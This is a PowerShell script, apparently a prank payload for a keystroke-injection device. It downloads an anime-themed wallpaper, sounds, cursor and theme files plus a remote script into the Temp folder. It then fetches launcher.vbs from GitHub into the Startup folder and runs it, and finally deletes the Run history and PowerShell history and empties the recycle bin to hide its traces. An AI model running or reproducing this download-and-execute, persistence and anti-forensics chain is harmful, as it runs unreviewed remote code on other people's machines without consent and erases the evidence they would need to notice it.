#1
Set-Location $env:Temp
Invoke-WebRequest https://wallpapersmug.com/download/2048x1152/2d07b6/cute-anime-girl-cake.jpg -O Anime.jpg
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/script.ps1 -O script.ps1
Invoke-WebRequest https://www.dropbox.com/s/8y9rcp0z8qlowxd/Connection.wav?dl=0 -O Connection.wav
Invoke-WebRequest https://www.dropbox.com/s/heghwxt0nf504xo/Disconnection.wav?dl=0 -O Disconnection.wav
Invoke-WebRequest https://www.dropbox.com/s/862izwnhrrr0zaq/genshin.ico?dl=0 -O genshin.ico
Invoke-WebRequest https://www.dropbox.com/s/z1j8bbfnuy0nl37/Naruto.wav?dl=0 -O Naruto.wav
Invoke-WebRequest https://www.dropbox.com/s/hwhn6q1t6t18jl8/xui2.cur?dl=0 -O xui2.cur
Invoke-WebRequest https://www.dropbox.com/s/u5vu3i4xv2ioqnw/Anime.theme?dl=0 -O Anime.theme

#2
Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
.\launcher.vbs

#3
# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
